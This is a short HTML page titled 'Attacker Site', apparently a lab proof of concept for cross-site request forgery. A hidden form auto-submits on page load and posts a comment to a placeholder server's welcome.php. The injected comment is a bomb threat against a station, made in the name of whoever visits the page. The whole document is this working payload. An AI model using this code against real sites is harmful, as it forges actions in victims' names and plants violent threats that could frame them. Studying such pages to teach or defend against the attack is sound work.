<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Attacker Site</title>
</head>
<body>
    <form action="http://<web_server_ip>/welcome.php" method="POST">
        <input type="hidden" name="comment" value="I will plant a bomb in xxxx station!" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
<html>
